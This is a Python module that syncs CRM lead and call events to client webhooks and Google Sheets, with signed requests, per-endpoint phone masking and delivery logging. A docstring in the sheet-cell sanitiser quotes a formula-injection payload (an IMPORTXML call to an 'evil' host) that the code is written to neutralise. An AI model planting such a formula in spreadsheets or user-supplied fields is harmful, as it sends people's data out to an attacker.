"""Outbound CRM sync — us → the client's tools (D-23).

Three properties this module exists to guarantee, in the order they matter:

**Nothing is delivered that the domain write did not commit.** Every event goes out
through the transactional outbox (BACKEND-PATTERNS §4): `enqueue_event` writes the
outbox row in the CALLER's transaction, so "lead created but the CRM never heard" and
"CRM told about a lead that rolled back" are both impossible.

**Every request is signed, and the signature covers the timestamp.** HMAC-SHA256 over
`{timestamp}.{body}` in `X-Calevate-Signature`, the scheme SEC-COMP §5 requires of our
inbound partners and therefore the one we owe ours. Signing the body alone would let a
captured request be replayed forever; the timestamp gives the receiver a window to
reject.

**Payloads are redacted by the same rule as everything else.** A lead's phone number is
PII whether it is in a log line or an HTTP body, so the envelope carries the masked form
unless the endpoint is explicitly configured otherwise — an opt-in the client makes
about their own data, recorded in the config row rather than assumed.

Delivery outcomes land in `webhook_deliveries(direction='out')`, which is the forensic
half of SEC-COMP §5 and the data the "webhook activity" screen reads.

**Two endpoint kinds, ONE definition of "delivered".** D-23 promises webhooks *and*
Google Sheets. They differ only in the transport at the very end: the fan-out, the
per-endpoint redaction, the delivery id, the forensic row and the retry ladder are
shared, because a client asking "did my lead arrive?" must get an answer built the same
way whichever box they ticked. The sheets-specific pieces live below under
`# --- google sheets ---` and are used by `apps/workers/sheets_sync.py`.
"""

from __future__ import annotations

import hashlib
import hmac
import json
import re
from collections.abc import Sequence
from dataclasses import dataclass
from datetime import UTC, datetime
from decimal import Decimal
from typing import Any
from uuid import UUID

import httpx
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncSession

from apps.api.core.logging import get_logger, redact_mapping
from apps.api.core.queue import WORKER_MAX_TRIES
from apps.api.db.base import uuid7
from apps.api.db.result import rowcount_of
from apps.api.reliability.service import enqueue_outbox

log = get_logger(__name__)

# The events a client endpoint may subscribe to (DATA-MODEL §6). Deliberately small:
# each one is a promise about payload shape we have to keep across versions.
EVENT_TYPES: tuple[str, ...] = (
    "lead.created",
    "lead.updated",
    "call.completed",
    "campaign.completed",
)

# The endpoint kinds in `outbound_webhooks.kind`.
WEBHOOK_KIND = "webhook"
SHEET_KIND = "google_sheets"

# Kinds `enqueue_event` will fan out to. Deliberately NOT `models.OUTBOUND_KINDS`: that
# tuple is the CHECK constraint — what may EXIST — and a kind added there must not start
# queueing deliveries into a worker that has no branch for it. A kind joins this tuple
# when it has a delivery path, and `tests/sheets_sync_test.py` asserts the two sets match
# so the reverse (a kind a client can configure and nothing delivers) cannot come back.
DELIVERABLE_KINDS: tuple[str, ...] = (WEBHOOK_KIND, SHEET_KIND)

SIGNATURE_HEADER = "X-Calevate-Signature"
TIMESTAMP_HEADER = "X-Calevate-Timestamp"
EVENT_HEADER = "X-Calevate-Event"
DELIVERY_HEADER = "X-Calevate-Delivery"

# Receivers are third-party endpoints on Indian SMB infrastructure; slow is normal,
# hanging is not. The retry ladder is ARQ's, so the exhaustion threshold MUST be
# ARQ's budget — a local number larger than the real one means the last try does not
# know it is the last, and the exhausted alert never fires (found by the runbook
# audit, pinned by a test).
DELIVERY_TIMEOUT_S = 10.0
MAX_ATTEMPTS = WORKER_MAX_TRIES


@dataclass(frozen=True, slots=True)
class DeliveryResult:
    """The outcome of ONE attempt at one endpoint, whatever the transport was."""

    delivered: bool
    status_code: int | None
    error: str | None = None
    # Which transport produced this. Written into the forensic row's `source`, so a
    # delivery log read six months later says how the lead was supposed to travel.
    channel: str = "http"
    # Whether another attempt could plausibly change the answer. `None` means "decide
    # from the HTTP status" — the webhook path's rules, which are the only ones a status
    # code can express. A transport with no status codes (the sheets append) MUST say,
    # because "no status" would otherwise read as a transport blip and a permanent
    # refusal would climb the ladder three times to reach the same no.
    transient: bool | None = None


def sign_payload(secret: str, *, timestamp: str, body: str) -> str:
    """`t={ts},v1={hex}` — the timestamp is INSIDE the signed string.

    A signature over the body alone is a bearer token for that body forever. With the
    timestamp signed, a receiver that rejects old timestamps also rejects replays, and
    an attacker cannot move a valid signature onto a fresh timestamp.
    """
    mac = hmac.new(secret.encode(), f"{timestamp}.{body}".encode(), hashlib.sha256)
    return f"t={timestamp},v1={mac.hexdigest()}"


def verify_signature(secret: str, *, header: str, body: str, tolerance_s: int = 300) -> bool:
    """The receiver's side, shipped so our docs can point at real code (and so the
    tests assert the scheme rather than our implementation of it)."""
    parts = dict(piece.split("=", 1) for piece in header.split(",") if "=" in piece)
    timestamp, provided = parts.get("t"), parts.get("v1")
    if not timestamp or not provided:
        return False
    try:
        age = abs(int(datetime.now(UTC).timestamp()) - int(timestamp))
    except ValueError:
        return False
    if age > tolerance_s:
        return False
    expected = hmac.new(secret.encode(), f"{timestamp}.{body}".encode(), hashlib.sha256)
    return hmac.compare_digest(expected.hexdigest(), provided)


def build_envelope(
    *, event: str, tenant_id: UUID, delivery_id: UUID, data: dict[str, Any]
) -> dict[str, Any]:
    """OUR envelope, stable across event types (D-23).

    `id` is the delivery id, not the object id, so a receiver deduplicating on it
    deduplicates RETRIES rather than collapsing two genuine updates to one lead.
    """
    return {
        "id": str(delivery_id),
        "event": event,
        "account_id": str(tenant_id),
        "created_at": datetime.now(UTC).isoformat(),
        "data": data,
    }


async def enqueue_event(
    session: AsyncSession,
    *,
    tenant_id: UUID,
    event: str,
    data: dict[str, Any],
) -> int:
    """Fan the event out to every active endpoint subscribed to it — one outbox row per
    endpoint, in the caller's transaction.

    One row per endpoint rather than one per event: endpoints fail independently, and a
    shared row would make a dead endpoint retry deliveries that already succeeded
    elsewhere.

    **Redaction happens HERE, per endpoint, because the fan-out is the last point that
    still knows which endpoint a payload is for.** The raw phone is a per-endpoint
    opt-in (docs/WEBHOOKS.md §1.2, recorded as `mapping.include_raw_phone`), and a
    caller that masked once before this call could not express it — every endpoint got
    the same body, so the opt-in was documented and unreachable. Masking on this side
    of the fan-out also means a caller that simply passes the domain row cannot leak:
    an endpoint that did not ask never gets a raw number in its outbox row.
    """
    if event not in EVENT_TYPES:
        raise ValueError(f"unknown outbound event: {event}")

    # Every kind we can actually deliver, not just `webhook`: a client who picked
    # Google Sheets subscribed to the same events and gets the same fan-out. The kind
    # is NOT copied into the payload — the worker reads it off the endpoint row, which
    # is the only place it can change.
    endpoints = (
        await session.execute(
            text(
                "SELECT id, mapping FROM outbound_webhooks WHERE active = true "
                "AND kind = ANY(:kinds) AND :event = ANY(events)"
            ),
            {"event": event, "kinds": list(DELIVERABLE_KINDS)},
        )
    ).all()

    for endpoint_id, mapping in endpoints:
        opted_in = bool((mapping or {}).get("include_raw_phone"))
        await enqueue_outbox(
            session,
            queue="default",
            job="deliver_outbound_webhook",
            payload={
                "tenant_id": str(tenant_id),
                "endpoint_id": str(endpoint_id),
                "event": event,
                "data": lead_payload(data, include_raw_phone=opted_in),
                # Minted HERE, not in the worker: ARQ replays the same payload on
                # retry, so a worker-side id would mint a new one per attempt and the
                # "one forensic row per delivery" claim would be false — and a receiver
                # deduplicating on it would treat every retry as a new event.
                "delivery_id": str(uuid7()),
            },
        )
    return len(endpoints)


async def load_endpoint(session: AsyncSession, endpoint_id: UUID) -> dict[str, Any] | None:
    """The endpoint as the worker sees it. MUST run inside a `tenant_session`: this is a
    plain select and RLS on `outbound_webhooks` is the whole of its tenant scoping, so a
    neighbour's endpoint id returns None rather than a row (hard rule 1)."""
    row = (
        await session.execute(
            text(
                "SELECT id, url, secret_ref, mapping, active, kind "
                "FROM outbound_webhooks WHERE id = :id"
            ),
            {"id": endpoint_id},
        )
    ).first()
    if row is None or not row[4]:
        return None
    # `secret` is the raw signing secret for a webhook and a secrets-manager REFERENCE
    # for a sheet (DATA-MODEL §6) — the column holds whichever the kind implies, and
    # neither is ever logged.
    return {"id": row[0], "url": row[1], "secret": row[2], "mapping": row[3] or {}, "kind": row[5]}


async def delivery_status(session: AsyncSession, delivery_id: UUID) -> str | None:
    """The recorded status of one delivery, or None if this tenant has no such row.

    Scoped THROUGH `outbound_webhooks` rather than read by primary key, for the same
    reason the client-facing delivery screen is: `webhook_deliveries` carries no RLS
    policy (engine webhooks arrive before a tenant is resolved), so a bare
    `WHERE id = :id` would let one tenant's delivered row answer for another's — and
    for the sheets path that answer SUPPRESSES an append.
    """
    row = (
        await session.execute(
            text(
                "SELECT status FROM webhook_deliveries WHERE id = :id "
                "AND endpoint_id IN (SELECT id FROM outbound_webhooks)"
            ),
            {"id": delivery_id},
        )
    ).first()
    if row is None or row[0] is None:
        return None
    return str(row[0])


def apply_mapping(data: dict[str, Any], mapping: dict[str, Any]) -> dict[str, Any]:
    """Rename our field names to the client's, if they asked us to.

    Absent mapping means our names. A mapping that names a field we did not send drops
    out silently rather than sending a null — a CRM column set to null on every sync is
    worse than a column that is simply not written.
    """
    if not mapping:
        return data
    renamed: dict[str, Any] = {}
    for ours, theirs in mapping.items():
        if ours in data:
            renamed[str(theirs)] = data[ours]
    return renamed


async def record_delivery(
    session: AsyncSession,
    *,
    delivery_id: UUID,
    endpoint_id: UUID,
    event: str,
    status: str,
    attempts: int,
    status_code: int | None,
    channel: str = "http",
) -> None:
    """Forensic log, upserted by delivery id so retries update one row (SEC-COMP §5).

    No payload column and no payload ref: the body is reconstructible from the domain
    row, and a table of un-redacted CRM payloads is a breach waiting for a query.

    `channel` is the transport (`http`, `sheets`). It is the only thing that differs
    between the two endpoint kinds here — ONE log, one row per delivery, one vocabulary
    of statuses (`delivered` / `failed` / `skipped`, WEBHOOKS §1.5) — so the delivery
    screen a client reads does not care which box they ticked.
    """
    source = f"{channel}_{status_code}" if status_code else channel
    result = await session.execute(
        text(
            "UPDATE webhook_deliveries SET attempts = :attempts, status = :status, "
            "source = :src, last_at = now() WHERE id = :id"
        ),
        {"attempts": attempts, "status": status, "src": source, "id": delivery_id},
    )
    if rowcount_of(result) == 0:
        await session.execute(
            text(
                "INSERT INTO webhook_deliveries (id, direction, source, event_type, status, "
                "attempts, endpoint_id, first_at, last_at, created_at) VALUES (:id, 'out', "
                ":src, :event, :status, :attempts, :endpoint, now(), now(), now())"
            ),
            {
                "id": delivery_id,
                "src": source,
                "event": event,
                "status": status,
                "attempts": attempts,
                "endpoint": endpoint_id,
            },
        )


async def deliver(
    *,
    url: str,
    secret: str,
    event: str,
    envelope: dict[str, Any],
    client: httpx.AsyncClient | None = None,
) -> DeliveryResult:
    """One signed POST. Raises nothing — the caller decides what a failure means.

    2xx is success. Everything else (including 3xx: a redirect to an unknown host is
    not a delivery we should follow with a signed body) is a failure the outbox retries.

    `follow_redirects=False` is set on the REQUEST, not only on the client we build:
    a 307 re-sends the body and our signature headers to whatever host the `Location`
    names, and the promise in docs/WEBHOOKS.md §1.5 must not depend on how a caller
    happened to construct the client it passed in.
    """
    body = json.dumps(envelope, separators=(",", ":"), default=str)
    timestamp = str(int(datetime.now(UTC).timestamp()))
    headers = {
        "Content-Type": "application/json",
        SIGNATURE_HEADER: sign_payload(secret, timestamp=timestamp, body=body),
        TIMESTAMP_HEADER: timestamp,
        EVENT_HEADER: event,
        DELIVERY_HEADER: str(envelope["id"]),
        "User-Agent": "Calevate-Webhooks/1",
    }
    owns_client = client is None
    http = client or httpx.AsyncClient(timeout=DELIVERY_TIMEOUT_S, follow_redirects=False)
    try:
        response = await http.post(url, content=body, headers=headers, follow_redirects=False)
        ok = 200 <= response.status_code < 300
        return DeliveryResult(
            delivered=ok,
            status_code=response.status_code,
            error=None if ok else f"HTTP {response.status_code}",
        )
    except httpx.HTTPError as exc:
        # The URL and the error TYPE are safe to log; the body never is.
        return DeliveryResult(delivered=False, status_code=None, error=type(exc).__name__)
    finally:
        if owns_client:
            await http.aclose()


def lead_payload(row: dict[str, Any], *, include_raw_phone: bool) -> dict[str, Any]:
    """What an event carries once the endpoint's own choice is applied.

    `include_raw_phone` is a per-endpoint opt-in, not a default: hard rule 6 is about
    logs, but the same reasoning applies to anything leaving our boundary. A client who
    needs the number in their CRM says so once, in the config row, and that choice is
    auditable. Everyone else gets the masked form the dashboard shows.

    An event with no `phone` at all (every `call.*` event) comes back unchanged — a
    masking pass must not ADD a field the published payload schema never declared.
    """
    payload = dict(row)
    if "phone" in payload and not include_raw_phone:
        masked = redact_mapping({"phone": payload["phone"]})
        payload["phone"] = masked.get("phone")
    return payload


# --- google sheets -------------------------------------------------------------
# The config row is the SAME row a webhook uses (DATA-MODEL §6): `url` names the
# spreadsheet, `secret_ref` is the secrets-manager reference to the service account,
# `mapping` carries the sheet-shaped extras. Nothing here needs a migration.
#
#     {"worksheet": "Leads",
#      "columns":  ["lead_id", "name", "phone", "status"],   <- ORDER LIVES IN A LIST
#      "headers":  {"lead_id": "Lead Ref"},
#      "include_raw_phone": false}

# Google's own id shape: url-safe base64-ish, 44 chars in practice. The floor of 20
# exists so a stray word in the url column cannot be mistaken for a document id.
_SHEET_URL_RE = re.compile(r"/spreadsheets/d/([A-Za-z0-9_-]{20,})")
_SHEET_ID_RE = re.compile(r"^[A-Za-z0-9_-]{20,}$")

DEFAULT_WORKSHEET = "Leads"

# Appended to every row and named in every header. It is the same id as the envelope's
# `id` and the forensic row's, which is what makes a sheet reconcilable against the
# delivery log by a human — and what a future adapter can read back to close the crash
# window described in `apps/workers/sheets_sync.py`.
SHEET_DELIVERY_HEADER = "Calevate Delivery ID"

# Column ORDER per event, for endpoints that did not choose their own. Only the events
# whose payload shape is published (WEBHOOKS §1.2) appear here: an event with no entry
# and no configured `columns` is REFUSED rather than guessed, because inferring the
# order from one row's keys silently shifts every value the first time a field is
# absent — and a spreadsheet has no per-row schema to catch it.
DEFAULT_SHEET_COLUMNS: dict[str, tuple[str, ...]] = {
    "lead.created": ("lead_id", "name", "phone", "source", "status"),
    "lead.updated": ("lead_id", "name", "phone", "source", "status"),
    "call.completed": (
        "call_id",
        "lead_id",
        "direction",
        "duration_s",
        "outcome",
        "sentiment",
        "summary",
    ),
}

# Characters that make a spreadsheet treat a cell as an expression. `=` and `@` are
# Sheets formulas; `+` and `-` are Excel's, which matters the moment the client exports
# to CSV. A lead's name is written by a caller or a web form, so this is untrusted text
# landing in a document a human opens.
_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")


def parse_spreadsheet_ref(url: str | None) -> str | None:
    """The spreadsheet id from what the client configured, or None if it is not one.

    Accepts the url they copy out of the browser and a bare id. Refuses everything else:
    appending a client's leads into a document we guessed the identity of is worse than
    not delivering, and the refusal is visible on their delivery screen.
    """
    if not url:
        return None
    candidate = url.strip()
    match = _SHEET_URL_RE.search(candidate)
    if match:
        return match.group(1)
    return candidate if _SHEET_ID_RE.match(candidate) else None


def sheet_worksheet(mapping: dict[str, Any]) -> str:
    """The tab to append to. One default, so an endpoint configured with no worksheet
    lands somewhere predictable rather than wherever the API considers first."""
    worksheet = mapping.get("worksheet")
    if isinstance(worksheet, str) and worksheet.strip():
        return worksheet.strip()
    return DEFAULT_WORKSHEET


def sheet_columns(event: str, mapping: dict[str, Any]) -> tuple[str, ...]:
    """OUR field names, in the order they become columns.

    Read from a JSON **array**, never from object keys: `mapping` is JSONB and Postgres
    stores object keys sorted by length then bytes, so a column order expressed as keys
    comes back scrambled and every row would land under different headings than the
    last. An empty result means "we do not know the order" and the caller must refuse.
    """
    configured = mapping.get("columns")
    if isinstance(configured, list):
        names = tuple(name for name in configured if isinstance(name, str) and name)
        if names:
            return names
    return DEFAULT_SHEET_COLUMNS.get(event, ())


def sheet_header(columns: Sequence[str], mapping: dict[str, Any]) -> list[str]:
    """The header row: the client's own column names where they gave us one.

    Order comes from `columns` (a list); `headers` only renames, so a jsonb object is
    the right shape for it and its key order is irrelevant.
    """
    raw = mapping.get("headers")
    headers = raw if isinstance(raw, dict) else {}
    return [str(headers.get(name, name)) for name in columns] + [SHEET_DELIVERY_HEADER]


def sheet_row(data: dict[str, Any], columns: Sequence[str], delivery_id: UUID | str) -> list[str]:
    """One row of cells, in column order, ending with the delivery id.

    A field the event did not carry is an EMPTY cell, never `None` — the same reasoning
    as `apply_mapping` not inventing nulls, except that here a missing value would print
    the word "None" into a document a client shows their staff.
    """
    return [_cell(data.get(name)) for name in columns] + [str(delivery_id)]


def _cell(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, bool):  # bool before int — it is a subclass
        return "true" if value else "false"
    if isinstance(value, str):
        rendered = value
    elif isinstance(value, int | float | Decimal):
        rendered = str(value)
    else:
        rendered = json.dumps(value, separators=(",", ":"), default=str)
    return _disarm(rendered)


def _disarm(rendered: str) -> str:
    """Neutralise spreadsheet formula injection, belt and braces with `RAW` input.

    The leading apostrophe is Sheets' own "this is text" marker: it is NOT shown in the
    rendered cell, so a phone number still reads as a phone number while
    `=IMPORTXML("https://evil…"&A1,"//x")` — a name a caller can choose — stays a
    string instead of exfiltrating the row it sits in.
    """
    return f"'{rendered}" if rendered[:1] in _FORMULA_LEADERS else rendered


__all__ = [
    "DEFAULT_SHEET_COLUMNS",
    "DEFAULT_WORKSHEET",
    "DELIVERABLE_KINDS",
    "DELIVERY_HEADER",
    "EVENT_HEADER",
    "EVENT_TYPES",
    "MAX_ATTEMPTS",
    "SHEET_DELIVERY_HEADER",
    "SHEET_KIND",
    "SIGNATURE_HEADER",
    "TIMESTAMP_HEADER",
    "WEBHOOK_KIND",
    "DeliveryResult",
    "apply_mapping",
    "build_envelope",
    "deliver",
    "delivery_status",
    "enqueue_event",
    "lead_payload",
    "load_endpoint",
    "parse_spreadsheet_ref",
    "record_delivery",
    "sheet_columns",
    "sheet_header",
    "sheet_row",
    "sheet_worksheet",
    "sign_payload",
    "verify_signature",
]
